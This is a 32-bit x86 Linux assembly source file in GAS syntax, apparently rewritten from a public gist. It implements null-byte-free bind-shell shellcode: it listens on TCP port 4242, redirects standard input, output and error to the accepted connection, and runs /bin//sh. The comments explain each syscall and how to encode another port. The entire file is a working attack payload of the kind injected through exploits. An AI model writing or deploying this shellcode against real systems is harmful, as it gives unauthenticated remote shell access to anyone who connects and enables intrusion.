.set PORT, 0x9210	# i.e. port = 4242
# to convert from a decimal port, you may use:
# $ python -c 'import struct,sys;print "0x"+struct.pack("<H", int(sys.argv[1])).encode("hex")' 4242
# or:
# $ python -c 'import struct;print "0x"+struct.pack("<H", 4242).encode("hex")'

	# Assembly code heavily inspired from
	# https://gist.github.com/geyslan/5174296
	# (I have just rewritten it in GAS syntax without null bytes)

.text
.globl _start
_start:
	# 0 #
	xorl %edi, %edi

	# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) #
	xorl %eax, %eax
	xorl %ebx, %ebx
	movb $0x66, %al		# 0x66 = 102 = sys_socketcall
	movb $0x1, %bl		# 1 = socket

	pushl %edi		# 0 = IPPROTO_IP
	pushl $1		# 1 = SOCK_STREAM
	pushl $2		# 2 = AF_INET

	movl %esp, %ecx
	int $0x80

	movl %eax, %edx		# socket file descriptor (sfd)

	# setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &socklen_t, socklen_t) #
	xorl %eax, %eax
	xorl %ebx, %ebx
	movb $0x66, %al		# 0x66 = 102 = sys_socketcall
	movb $0xe, %bl		# 0xe = 14 = setsockopt

	pushl $0x4		# sizeof socklen_t
	pushl %esp		# addr of socklen_t
	pushl $0x2		# 2 = SO_REUSEADDR = 2
	pushl $0x1		# 1 = SOL_SOCKET
	pushl %edx		# sfd

	movl %esp, %ecx
	int $0x80		# syscall

	# bind(sockfd, [AF_INET, 11111, INADDR_ANY], 16) #
	xorl %eax, %eax
	xorl %ebx, %ebx
	movb $0x66, %al		# 0x66 = 102 = sys_socketcall
	movb $0x2, %bl		# 2 = bind

	pushl %edi		# 0 = INADDR_ANY
	pushw $PORT		# port in byte reverse order
	pushw $0x2		# 2 = AF_INET
	movl %esp,%ecx		# struct pointer

	pushl $0x10		# 0x10 = 16 = sizeof(struct sockaddr)
	pushl %ecx		# (struct sockaddr *)
	pushl %edx		# sfd

	movl %esp, %ecx
	int $0x80		# syscall

	# listen(sfd, 0) #
	xorl %eax, %eax
	xorl %ebx, %ebx
	movb $0x66, %al		# 0x66 = 102 = sys_socketcall
	movb $0x4, %bl		# 4 = listen

	pushl %edi		# 0 = backlog (connections queue size)
	pushl %edx		# sfd

	movl %esp, %ecx
	int $0x80		# syscall

	# accept(sockfd, NULL, NULL) #
	xorl %eax, %eax
	xorl %ebx, %ebx
	movb $0x66, %al		# 0x66 = 102 = sys_socketcall
	movb $0x5, %bl		# 5 = accept

	pushl %edi		# NULL
	pushl %edi		# NULL
	pushl %edx		# sfd

	movl %esp, %ecx
	int $0x80		# syscall

	mov %eax, %ebx		# oldfd = received socket fd

	# dup2(oldfd, newfd) #
	xorl %eax, %eax
	movb $0x3f, %al		# 0x3f = 63 = sys_dup2
	xorl %ecx, %ecx		# newfd = 0 = stdin
	int $0x80		# syscall

	xorl %eax, %eax
	movb $0x3f, %al		# 0x3f = 63 = sys_dup2
	inc %ecx		# newfd = 1 = stdout
	int $0x80		# syscall

	xorl %eax, %eax
	movb $0x3f, %al		# 0x3f = 63 = sys_dup2
	inc %ecx		# newfd = 2 = stderr
	int $0x80		# syscall

	xorl %eax, %eax
	movb $0xb, %al		# sys_execve
	cdq			# env = %edx = NULL
	pushl %edx		# null-terminator byte(s)
	pushl $0x68732f2f	# '//sh'
	pushl $0x6e69622f	# '/bin'
	movl %esp, %ebx		# "/bin//sh" addr
	movl %edx, %ecx		# argv = %ecx = NULL 
	int $0x80		# syscall
	
